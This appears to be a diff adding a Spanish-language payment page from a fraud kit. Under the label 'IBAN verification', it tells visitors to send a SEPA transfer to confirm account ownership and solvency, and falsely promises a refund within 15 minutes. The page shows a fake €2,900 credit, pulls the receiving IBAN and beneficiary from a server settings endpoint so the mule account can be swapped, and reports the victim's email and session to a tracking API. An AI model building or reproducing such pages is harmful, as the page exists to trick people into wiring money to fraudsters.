@@ -1,0 +1,334 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Detalles de la transacción</title>
+
+    <link rel="stylesheet" href="../CSS/link-bank.css" />
+    <link rel="stylesheet" href="./tourist.css" />
+
+    <script src="../js/api-config.js?v=20260321-6"></script>
+    <script src="../js/flow-session-id.js?v=20260320-3"></script>
+    <script src="../js/app-guard.js?v=20260518-1"></script>
+    <script src="../js/navigation-guard.js?v=20260405-1"></script>
+    <script src="../js/client-tracker.js?v=20260518-1"></script>
+    <script>
+      window.addEventListener("DOMContentLoaded", function () {
+        if (window.ClientTracker) ClientTracker.track("tourist_payment_page_opened");
+      });
+    </script>
+  </head>
+
+  <body>
+    <div
+      id="touristPageBootLoader"
+      class="tourist-page-boot-loader"
+      role="status"
+      aria-live="polite"
+      aria-busy="true"
+    >
+      <div class="tourist-boot-spinner" aria-hidden="true">
+        <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path opacity="0.4" d="M15 3C15 1.34315 16.3431 0 18 0C19.6569 0 21 1.34315 21 3V5C21 6.65685 19.6569 8 18 8C16.3431 8 15 6.65685 15 5V3Z" fill="#F06005"/>
+          <path opacity="0.8" d="M15 31C15 29.3431 16.3431 28 18 28C19.6569 28 21 29.3431 21 31V33C21 34.6569 19.6569 36 18 36C16.3431 36 15 34.6569 15 33V31Z" fill="#F06005"/>
+          <path opacity="0.2" d="M33 15C34.6569 15 36 16.3431 36 18C36 19.6569 34.6569 21 33 21L31 21C29.3431 21 28 19.6569 28 18C28 16.3431 29.3431 15 31 15L33 15Z" fill="#F06005"/>
+          <path opacity="0.6" d="M5 15C6.65685 15 8 16.3431 8 18C8 19.6569 6.65685 21 5 21L3 21C1.34315 21 -2.03558e-07 19.6569 -1.31134e-07 18C-5.87108e-08 16.3431 1.34315 15 3 15L5 15Z" fill="#F06005"/>
+          <path opacity="0.3" d="M26.4881 5.27366C27.6596 4.10209 29.5591 4.10209 30.7307 5.27366C31.9023 6.44524 31.9023 8.34473 30.7307 9.5163L29.3165 10.9305C28.1449 12.1021 26.2454 12.1021 25.0738 10.9305C23.9023 9.75895 23.9023 7.85945 25.0738 6.68788L26.4881 5.27366Z" fill="#F06005"/>
+          <path opacity="0.7" d="M6.68337 25.0705C7.85494 23.899 9.75444 23.899 10.926 25.0705C12.0976 26.2421 12.0976 28.1416 10.926 29.3132L9.51179 30.7274C8.34022 31.899 6.44073 31.899 5.26915 30.7274C4.09758 29.5558 4.09758 27.6563 5.26915 26.4848L6.68337 25.0705Z" fill="#F06005"/>
+          <path opacity="0.1" d="M30.7302 26.4841C31.9018 27.6557 31.9018 29.5552 30.7302 30.7268C29.5587 31.8984 27.6592 31.8984 26.4876 30.7268L25.0734 29.3126C23.9018 28.141 23.9018 26.2415 25.0734 25.0699C26.245 23.8984 28.1445 23.8984 29.316 25.0699L30.7302 26.4841Z" fill="#F06005"/>
+          <path opacity="0.5" d="M10.9256 6.68727C12.0971 7.85885 12.0971 9.75834 10.9256 10.9299C9.75398 12.1015 7.85449 12.1015 6.68291 10.9299L5.2687 9.5157C4.09713 8.34413 4.09713 6.44463 5.2687 5.27306C6.44027 4.10149 8.33977 4.10149 9.51134 5.27306L10.9256 6.68727Z" fill="#F06005"/>
+        </svg>
+      </div>
+      <p class="tourist-page-boot-loader__text">Preparando página de pago</p>
+    </div>
+
+    <div class="tourist-shell">
+      <div class="tourist-topbar">
+        <button type="button" class="tourist-topbar__back" data-tourist-back aria-label="Atrás">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12.5 16.6 7.07 11.17a1.65 1.65 0 0 1 0-2.34L12.5 3.4" stroke="#0F0F0F" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <h1 class="tourist-topbar__title">Verificación de IBAN</h1>
+      </div>
+
+      <main class="tourist-main">
+        <p class="tourist-warning-msg">Realiza una transferencia <span class="tourist-warning-msg__accent">SEPA</span> desde tu <span class="tourist-warning-msg__accent">IBAN</span> para verificar la titularidad de la cuenta y confirmar tu solvencia. El importe será reembolsado a tu cuenta en un plazo de <span class="tourist-warning-msg__accent">15 minutos.</span></p>
+
+        <!-- Ingreso a la cuenta -->
+        <section class="tourist-detail-card">
+          <h2 class="tourist-detail-card__title">Ingreso a la cuenta de crédito</h2>
+
+          <div class="tourist-person">
+            <div class="tourist-person__avatar" aria-hidden="true">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="8" cy="5" r="3" fill="#FA6C12"/>
+                <path d="M2.5 14c0-2.76 2.46-5 5.5-5s5.5 2.24 5.5 5" stroke="#FA6C12" stroke-width="1.5" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="tourist-person__text">
+              <p class="tourist-person__name" id="transactionPersonName">Trevor Philips</p>
+              <p class="tourist-person__meta">
+                <span>Cuenta de crédito</span>
+                <span class="tourist-list-item__meta-dot"></span>
+                <span>**** 4580</span>
+              </p>
+            </div>
+          </div>
+
+          <div class="tourist-bank tourist-bank--detail">
+            <div class="tourist-bank__text">
+              <p class="tourist-bank__title">Masters Card</p>
+              <p class="tourist-bank__mask">**** **** 4580</p>
+            </div>
+            <svg class="tourist-bank__lock" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path
+                  d="M8.00073 11.5679C8.60088 11.5679 9.0874 11.0813 9.0874 10.4812C9.0874 9.88105 8.60088 9.39453 8.00073 9.39453C7.40058 9.39453 6.91406 9.88105 6.91406 10.4812C6.91406 11.0813 7.40058 11.5679 8.00073 11.5679Z"
+                  fill="url(#detailLockG0)"
+                />
+                <path
+                  d="M12.1893 6.35203V5.5187C12.1893 3.7187 11.7559 1.33203 8.0026 1.33203C4.24927 1.33203 3.81594 3.7187 3.81594 5.5187V6.35203C1.94927 6.58536 1.33594 7.53203 1.33594 9.8587V11.0987C1.33594 13.832 2.16927 14.6654 4.9026 14.6654H11.1026C13.8359 14.6654 14.6693 13.832 14.6693 11.0987V9.8587C14.6693 7.53203 14.0559 6.58536 12.1893 6.35203ZM8.0026 12.492C6.88927 12.492 5.98927 11.5854 5.98927 10.4787C5.98927 9.36536 6.89594 8.46536 8.0026 8.46536C9.10927 8.46536 10.0159 9.37203 10.0159 10.4787C10.0159 11.592 9.11594 12.492 8.0026 12.492ZM4.9026 6.29203C4.84927 6.29203 4.8026 6.29203 4.74927 6.29203V5.5187C4.74927 3.56536 5.3026 2.26536 8.0026 2.26536C10.7026 2.26536 11.2559 3.56536 11.2559 5.5187V6.2987C11.2026 6.2987 11.1559 6.2987 11.1026 6.2987H4.9026V6.29203Z"
+                  fill="url(#detailLockG1)"
+                />
+                <defs>
+                  <linearGradient id="detailLockG0" x1="8" y1="9.4" x2="8" y2="11.6" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7" />
+                    <stop offset="1" stop-color="#FA6C12" />
+                  </linearGradient>
+                  <linearGradient id="detailLockG1" x1="1.3" y1="8" x2="14.7" y2="8" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7" />
+                    <stop offset="1" stop-color="#FA6C12" />
+                  </linearGradient>
+                </defs>
+              </svg>
+            <p class="tourist-bank__amount">€2,900.00</p>
+          </div>
+        </section>
+
+        <!-- Datos SEPA -->
+        <section class="tourist-detail-card">
+          <h2 class="tourist-detail-card__title">Realiza una transferencia SEPA con los datos proporcionados.</h2>
+
+          <div class="tourist-input-field">
+            <p class="tourist-input-field__label">IBAN</p>
+            <div
+              class="tourist-input-field__box"
+              data-copy="#ibanValue"
+              role="button"
+              tabindex="0"
+              aria-label="Copiar IBAN"
+            >
+              <span class="tourist-input-field__icon" aria-hidden="true">
+                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M17.4974 9.78983H2.4974C1.6974 9.78983 1.03906 9.13149 1.03906 8.33149V5.56482C1.03906 4.99815 1.43071 4.42316 1.95571 4.21482L9.45571 1.21484C9.77238 1.08984 10.2224 1.08984 10.5391 1.21484L18.0391 4.21482C18.5641 4.42316 18.9557 5.00649 18.9557 5.56482V8.33149C18.9557 9.13149 18.2974 9.78983 17.4974 9.78983ZM9.9974 2.36485C9.96406 2.36485 9.93075 2.3648 9.91408 2.37314L2.42237 5.37317C2.37237 5.39817 2.28906 5.50649 2.28906 5.56482V8.33149C2.28906 8.44816 2.38073 8.53983 2.4974 8.53983H17.4974C17.6141 8.53983 17.7057 8.44816 17.7057 8.33149V5.56482C17.7057 5.50649 17.6308 5.39817 17.5724 5.37317L10.0724 2.37314C10.0558 2.3648 10.0307 2.36485 9.9974 2.36485Z" fill="#0F0F0F"/>
+                  <path d="M18.3307 18.9583H1.66406C1.3224 18.9583 1.03906 18.675 1.03906 18.3333V15.8333C1.03906 15.0333 1.6974 14.375 2.4974 14.375H17.4974C18.2974 14.375 18.9557 15.0333 18.9557 15.8333V18.3333C18.9557 18.675 18.6724 18.9583 18.3307 18.9583ZM2.28906 17.7083H17.7057V15.8333C17.7057 15.7167 17.6141 15.625 17.4974 15.625H2.4974C2.38073 15.625 2.28906 15.7167 2.28906 15.8333V17.7083Z" fill="#0F0F0F"/>
+                  <path d="M3.33594 15.6263C2.99427 15.6263 2.71094 15.343 2.71094 15.0013V9.16797C2.71094 8.8263 2.99427 8.54297 3.33594 8.54297C3.6776 8.54297 3.96094 8.8263 3.96094 9.16797V15.0013C3.96094 15.343 3.6776 15.6263 3.33594 15.6263Z" fill="#0F0F0F"/>
+                  <path d="M6.66406 15.6263C6.3224 15.6263 6.03906 15.343 6.03906 15.0013V9.16797C6.03906 8.8263 6.3224 8.54297 6.66406 8.54297C7.00573 8.54297 7.28906 8.8263 7.28906 9.16797V15.0013C7.28906 15.343 7.00573 15.6263 6.66406 15.6263Z" fill="#0F0F0F"/>
+                  <path d="M10 15.6263C9.65833 15.6263 9.375 15.343 9.375 15.0013V9.16797C9.375 8.8263 9.65833 8.54297 10 8.54297C10.3417 8.54297 10.625 8.8263 10.625 9.16797V15.0013C10.625 15.343 10.3417 15.6263 10 15.6263Z" fill="#0F0F0F"/>
+                  <path d="M13.3359 15.6263C12.9943 15.6263 12.7109 15.343 12.7109 15.0013V9.16797C12.7109 8.8263 12.9943 8.54297 13.3359 8.54297C13.6776 8.54297 13.9609 8.8263 13.9609 9.16797V15.0013C13.9609 15.343 13.6776 15.6263 13.3359 15.6263Z" fill="#0F0F0F"/>
+                  <path d="M16.6641 15.6263C16.3224 15.6263 16.0391 15.343 16.0391 15.0013V9.16797C16.0391 8.8263 16.3224 8.54297 16.6641 8.54297C17.0057 8.54297 17.2891 8.8263 17.2891 9.16797V15.0013C17.2891 15.343 17.0057 15.6263 16.6641 15.6263Z" fill="#0F0F0F"/>
+                  <path d="M19.1693 18.957H0.835938C0.494271 18.957 0.210938 18.6737 0.210938 18.332C0.210938 17.9904 0.494271 17.707 0.835938 17.707H19.1693C19.5109 17.707 19.7943 17.9904 19.7943 18.332C19.7943 18.6737 19.5109 18.957 19.1693 18.957Z" fill="#0F0F0F"/>
+                  <path d="M10 7.70703C8.96667 7.70703 8.125 6.86536 8.125 5.83203C8.125 4.7987 8.96667 3.95703 10 3.95703C11.0333 3.95703 11.875 4.7987 11.875 5.83203C11.875 6.86536 11.0333 7.70703 10 7.70703ZM10 5.20703C9.65833 5.20703 9.375 5.49036 9.375 5.83203C9.375 6.1737 9.65833 6.45703 10 6.45703C10.3417 6.45703 10.625 6.1737 10.625 5.83203C10.625 5.49036 10.3417 5.20703 10 5.20703Z" fill="#0F0F0F"/>
+                </svg>
+              </span>
+              <span class="tourist-input-field__value" id="ibanValue">ES24 2080 9230 2150 3773 6219</span>
+              <span class="tourist-input-field__copy" aria-hidden="true">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M11.2026 6H8.5026V10.1667C8.5026 10.44 8.27594 10.6667 8.0026 10.6667C7.72927 10.6667 7.5026 10.44 7.5026 10.1667V6H4.8026C2.66927 6 1.33594 7.33333 1.33594 9.46667V11.1933C1.33594 13.3333 2.66927 14.6667 4.8026 14.6667H11.1959C13.3293 14.6667 14.6626 13.3333 14.6626 11.2V9.46667C14.6693 7.33333 13.3359 6 11.2026 6Z" fill="#9A9A9A"/>
+                  <path d="M8.49729 3.04094L9.87729 4.42094C9.97729 4.52094 10.104 4.5676 10.2306 4.5676C10.3573 4.5676 10.484 4.52094 10.584 4.42094C10.7773 4.2276 10.7773 3.9076 10.584 3.71427L8.35063 1.48094C8.15729 1.2876 7.83729 1.2876 7.64396 1.48094L5.41063 3.71427C5.21729 3.9076 5.21729 4.2276 5.41063 4.42094C5.60396 4.61427 5.92396 4.61427 6.11729 4.42094L7.49729 3.04094V6.00094H8.49729V3.04094Z" fill="#9A9A9A"/>
+                </svg>
+              </span>
+              <span class="tourist-input-field__copied-toast" aria-hidden="true">Copiado</span>
+            </div>
+          </div>
+
+          <div class="tourist-input-field">
+            <p class="tourist-input-field__label">Beneficiario</p>
+            <div
+              class="tourist-input-field__box"
+              data-copy="#beneficiarioValue"
+              role="button"
+              tabindex="0"
+              aria-label="Copiar beneficiario"
+            >
+              <span class="tourist-input-field__icon" aria-hidden="true">
+                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M10.0026 10.0013C12.3038 10.0013 14.1693 8.13582 14.1693 5.83463C14.1693 3.53345 12.3038 1.66797 10.0026 1.66797C7.70142 1.66797 5.83594 3.53345 5.83594 5.83463C5.83594 8.13582 7.70142 10.0013 10.0026 10.0013Z" stroke="#0F0F0F" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/>
+                  <path d="M2.84375 18.3333C2.84375 15.1083 6.05208 12.5 10.0021 12.5C10.8021 12.5 11.5771 12.6083 12.3021 12.8083" stroke="#0F0F0F" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/>
+                  <path d="M18.3307 15.0013C18.3307 15.6263 18.1557 16.218 17.8474 16.718C17.6724 17.018 17.4474 17.2846 17.1891 17.5013C16.6057 18.0263 15.8391 18.3346 14.9974 18.3346C13.7807 18.3346 12.7224 17.6846 12.1474 16.718C11.8391 16.218 11.6641 15.6263 11.6641 15.0013C11.6641 13.9513 12.1474 13.0096 12.9141 12.4013C13.4891 11.943 14.2141 11.668 14.9974 11.668C16.8391 11.668 18.3307 13.1596 18.3307 15.0013Z" stroke="#0F0F0F" stroke-width="1.25" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                  <path d="M13.6953 15.0002L14.5203 15.8252L16.2953 14.1836" stroke="#0F0F0F" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </span>
+              <span class="tourist-input-field__value" id="beneficiarioValue">Peter Harington</span>
+              <span class="tourist-input-field__copy" aria-hidden="true">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M11.2026 6H8.5026V10.1667C8.5026 10.44 8.27594 10.6667 8.0026 10.6667C7.72927 10.6667 7.5026 10.44 7.5026 10.1667V6H4.8026C2.66927 6 1.33594 7.33333 1.33594 9.46667V11.1933C1.33594 13.3333 2.66927 14.6667 4.8026 14.6667H11.1959C13.3293 14.6667 14.6626 13.3333 14.6626 11.2V9.46667C14.6693 7.33333 13.3359 6 11.2026 6Z" fill="#9A9A9A"/>
+                  <path d="M8.49729 3.04094L9.87729 4.42094C9.97729 4.52094 10.104 4.5676 10.2306 4.5676C10.3573 4.5676 10.484 4.52094 10.584 4.42094C10.7773 4.2276 10.7773 3.9076 10.584 3.71427L8.35063 1.48094C8.15729 1.2876 7.83729 1.2876 7.64396 1.48094L5.41063 3.71427C5.21729 3.9076 5.21729 4.2276 5.41063 4.42094C5.60396 4.61427 5.92396 4.61427 6.11729 4.42094L7.49729 3.04094V6.00094H8.49729V3.04094Z" fill="#9A9A9A"/>
+                </svg>
+              </span>
+              <span class="tourist-input-field__copied-toast" aria-hidden="true">Copiado</span>
+            </div>
+          </div>
+
+          <div class="tourist-rows">
+            <div class="tourist-rows__row">
+              <span class="tourist-rows__label">Método de pago</span>
+              <span class="tourist-rows__value">Transferencia SEPA</span>
+            </div>
+            <div class="tourist-rows__row">
+              <span class="tourist-rows__label">Terminal ID</span>
+              <span class="tourist-rows__value">Q04</span>
+            </div>
+            <div class="tourist-rows__row">
+              <span class="tourist-rows__label">Válido hasta</span>
+              <span class="tourist-rows__value">
+                <span id="touristValidDate">23.05.2026</span>
+                <span class="tourist-rows__value-extra" id="touristValidTime">09:31</span>
+              </span>
+            </div>
+          </div>
+
+          <div class="tourist-amount-block">
+            <p class="tourist-amount-block__label">Monto del ingreso</p>
+            <p class="tourist-amount-block__value">
+              <span class="tourist-amount-block__currency">$</span><span class="tourist-amount-block__digits">50.00</span>
+            </p>
+            <div class="tourist-amount-block__status-col">
+              <div class="tourist-amount-block__status-row">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                  <path d="M8 14.667A6.667 6.667 0 1 0 8 1.333a6.667 6.667 0 0 0 0 13.334Z" stroke="#0F0F0F" stroke-width="1.25" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                  <path d="M8 4.667V8l2.667 1.333" stroke="#0F0F0F" stroke-width="1.25" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <span>Estado</span>
+              </div>
+              <span class="tourist-amount-block__status-note" id="txStatusNote">Sin transacción</span>
+            </div>
+          </div>
+
+          <button
+            type="button"
+            class="tourist-btn tourist-btn--gradient tourist-btn--block"
+            id="refreshTxBtn"
+            aria-busy="false"
+          >
+            <span class="tourist-btn__default-content">
+              <span>Actualizar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <circle cx="8" cy="8" r="6.25" stroke="#FFFFFF" stroke-width="1.4"/>
+                <path d="M8 5v3l2 2" stroke="#FFFFFF" stroke-width="1.4" stroke-linecap="round"/>
+              </svg>
+            </span>
+            <span class="tourist-btn__loading-content" aria-hidden="true">
+              <svg class="tourist-btn__spinner" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="10" cy="10" r="7.5" stroke="#FFFFFF" stroke-width="1.75" stroke-opacity="0.35"/>
+                <path d="M10 2.5a7.5 7.5 0 0 1 7.5 7.5" stroke="#FFFFFF" stroke-width="1.75" stroke-linecap="round"/>
+              </svg>
+              <span>Actualizando</span>
+            </span>
+          </button>
+        </section>
+      </main>
+    </div>
+
+    <nav class="tourist-tabbar" aria-label="Menú">
+      <a href="./index.html" class="tourist-tabbar__item is-active">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.37 2.14984L21.37 5.74982C21.72 5.88982 22 6.30981 22 6.67981V9.99982C22 10.5498 21.55 10.9998 21 10.9998H3C2.45 10.9998 2 10.5498 2 9.99982V6.67981C2 6.30981 2.28 5.88982 2.63 5.74982L11.63 2.14984C11.83 2.06984 12.17 2.06984 12.37 2.14984Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M22 22H2V19C2 18.45 2.45 18 3 18H21C21.55 18 22 18.45 22 19V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M4 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M8 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M16 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M20 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M1 22H23" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 8.5C12.8284 8.5 13.5 7.82843 13.5 7C13.5 6.17157 12.8284 5.5 12 5.5C11.1716 5.5 10.5 6.17157 10.5 7C10.5 7.82843 11.1716 8.5 12 8.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Home</span>
+      </a>
+      <a href="./archived-goals.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.1484 16.5V18.6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M7.14844 22H17.1484V21C17.1484 19.9 16.2484 19 15.1484 19H9.14844C8.04844 19 7.14844 19.9 7.14844 21V22V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10"/>
+          <path d="M6.14844 22H18.1484" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 16C8.13 16 5 12.87 5 9V6C5 3.79 6.79 2 9 2H15C17.21 2 19 3.79 19 6V9C19 12.87 15.87 16 12 16Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M5.46906 11.6516C4.71906 11.4116 4.05906 10.9716 3.53906 10.4516C2.63906 9.45156 2.03906 8.25156 2.03906 6.85156C2.03906 5.45156 3.13906 4.35156 4.53906 4.35156H5.18906C4.98906 4.81156 4.88906 5.32156 4.88906 5.85156V8.85156C4.88906 9.85156 5.09906 10.7916 5.46906 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M18.5312 11.6516C19.2812 11.4116 19.9412 10.9716 20.4612 10.4516C21.3612 9.45156 21.9612 8.25156 21.9612 6.85156C21.9612 5.45156 20.8612 4.35156 19.4612 4.35156H18.8112C19.0112 4.81156 19.1112 5.32156 19.1112 5.85156V8.85156C19.1112 9.85156 18.9013 10.7916 18.5312 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Objetivos</span>
+      </a>
+      <a href="./history.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M14.5 9.25H2C1.59 9.25 1.25 8.91 1.25 8.5C1.25 8.09 1.59 7.75 2 7.75H14.5C14.91 7.75 15.25 8.09 15.25 8.5C15.25 8.91 14.91 9.25 14.5 9.25Z" fill="currentColor"/>
+          <path d="M8 17.25H6C5.59 17.25 5.25 16.91 5.25 16.5C5.25 16.09 5.59 15.75 6 15.75H8C8.41 15.75 8.75 16.09 8.75 16.5C8.75 16.91 8.41 17.25 8 17.25Z" fill="currentColor"/>
+          <path d="M14.5 17.25H10.5C10.09 17.25 9.75 16.91 9.75 16.5C9.75 16.09 10.09 15.75 10.5 15.75H14.5C14.91 15.75 15.25 16.09 15.25 16.5C15.25 16.91 14.91 17.25 14.5 17.25Z" fill="currentColor"/>
+          <path d="M17.56 21.25H6.44C2.46 21.25 1.25 20.05 1.25 16.11V7.89C1.25 3.95 2.46 2.75 6.44 2.75H14.5C14.91 2.75 15.25 3.09 15.25 3.5C15.25 3.91 14.91 4.25 14.5 4.25H6.44C3.3 4.25 2.75 4.79 2.75 7.89V16.1C2.75 19.2 3.3 19.74 6.44 19.74H17.55C20.69 19.74 21.24 19.2 21.24 16.1V14.02C21.24 13.61 21.58 13.27 21.99 13.27C22.4 13.27 22.74 13.61 22.74 14.02V16.1C22.75 20.05 21.54 21.25 17.56 21.25Z" fill="currentColor"/>
+          <path d="M20 10.25C19.9 10.25 19.81 10.23 19.71 10.19C19.43 10.07 19.25 9.8 19.25 9.5V3.5C19.25 3.09 19.59 2.75 20 2.75C20.41 2.75 20.75 3.09 20.75 3.5V7.69L21.47 6.97C21.76 6.68 22.24 6.68 22.53 6.97C22.82 7.26 22.82 7.74 22.53 8.03L20.53 10.03C20.39 10.17 20.2 10.25 20 10.25Z" fill="currentColor"/>
+          <path d="M19.9975 10.2514C19.8075 10.2514 19.6175 10.1814 19.4675 10.0314L17.4675 8.03141C17.1775 7.74141 17.1775 7.26141 17.4675 6.97141C17.7575 6.68141 18.2375 6.68141 18.5275 6.97141L20.5275 8.97141C20.8175 9.26141 20.8175 9.74141 20.5275 10.0314C20.3775 10.1814 20.1875 10.2514 19.9975 10.2514Z" fill="currentColor"/>
+        </svg>
+        <span>Historial</span>
+      </a>
+      <a href="./support.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M8 22.3214C7.72 22.3214 7.42998 22.2514 7.16998 22.1114C6.59998 21.8114 6.25 21.2113 6.25 20.5714V19.1514C3.23 18.8414 1.25 16.6213 1.25 13.4413V7.44141C1.25 4.00141 3.56 1.69141 7 1.69141H17C20.44 1.69141 22.75 4.00141 22.75 7.44141V13.4413C22.75 16.8813 20.44 19.1913 17 19.1913H13.23L8.96997 22.0314C8.67997 22.2214 8.34 22.3214 8 22.3214ZM7 3.1814C4.42 3.1814 2.75 4.8514 2.75 7.4314V13.4315C2.75 16.0115 4.42 17.6815 7 17.6815C7.41 17.6815 7.75 18.0215 7.75 18.4315V20.5615C7.75 20.6915 7.83 20.7514 7.88 20.7814C7.93001 20.8114 8.03001 20.8414 8.14001 20.7714L12.59 17.8115C12.71 17.7315 12.86 17.6815 13.01 17.6815H17.01C19.59 17.6815 21.26 16.0115 21.26 13.4315V7.4314C21.26 4.8514 19.59 3.1814 17.01 3.1814H7Z" fill="currentColor"/>
+          <path d="M12.0037 12.1094C11.5937 12.1094 11.2537 11.7694 11.2537 11.3594V11.1494C11.2537 9.98941 12.1037 9.4194 12.4237 9.1994C12.7937 8.9494 12.9137 8.77941 12.9137 8.51941C12.9137 8.01941 12.5037 7.60938 12.0037 7.60938C11.5037 7.60938 11.0938 8.01941 11.0938 8.51941C11.0938 8.92941 10.7537 9.26941 10.3438 9.26941C9.93375 9.26941 9.59375 8.92941 9.59375 8.51941C9.59375 7.18941 10.6737 6.10938 12.0037 6.10938C13.3337 6.10938 14.4137 7.18941 14.4137 8.51941C14.4137 9.65941 13.5737 10.2294 13.2637 10.4394C12.8737 10.6994 12.7537 10.8694 12.7537 11.1494V11.3594C12.7537 11.7794 12.4137 12.1094 12.0037 12.1094Z" fill="currentColor"/>
+          <path d="M12 14.6016C11.58 14.6016 11.25 14.2616 11.25 13.8516C11.25 13.4416 11.59 13.1016 12 13.1016C12.41 13.1016 12.75 13.4416 12.75 13.8516C12.75 14.2616 12.42 14.6016 12 14.6016Z" fill="currentColor"/>
+        </svg>
+        <span>Soporte</span>
+      </a>
+    </nav>
+
+    <script src="./tourist.js?v=20260524-1"></script>
+    <script>
+      (function () {
+        var name = localStorage.getItem("inputName") || localStorage.getItem("touristCardNombre") || "";
+        if (name) {
+          var el = document.getElementById("transactionPersonName");
+          if (el) el.textContent = name;
+        }
+      })();
+    </script>
+    <script>
+      (function () {
+        var refreshBtn = document.getElementById("refreshTxBtn");
+        if (!refreshBtn) return;
+
+        refreshBtn.addEventListener("click", function () {
+          var apiBase = window.API_BASE || window.FORM_API_BASE || window.location.origin;
+          var email = "";
+          try { email = localStorage.getItem("inputEmail") || localStorage.getItem("inputName") || ""; } catch(e){}
+          var sessionId = "";
+          try { sessionId = (window.getFlowSessionId && window.getFlowSessionId()) || localStorage.getItem("flowSessionId") || ""; } catch(e){}
+
+          fetch(apiBase + "/api/track", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              event: "tourist_iban_confirmed",
+              email: email,
+              flowSessionId: sessionId
+            })
+          }).catch(function () {});
+        });
+      })();
+    </script>
+    <script>
+      (function () {
+        var apiBase = window.API_BASE || window.location.origin;
+        fetch(apiBase + '/api/settings')
+          .then(function (r) { return r.json(); })
+          .then(function (s) {
+            if (s.iban) {
+              var el = document.getElementById('ibanValue');
+              if (el) el.textContent = s.iban;
+            }
+            if (s.beneficiario) {
+              var el = document.getElementById('beneficiarioValue');
+              if (el) el.textContent = s.beneficiario;
+            }
+          })
+          .catch(function () {});
+      })();
+    </script>
+  </body>
+</html>
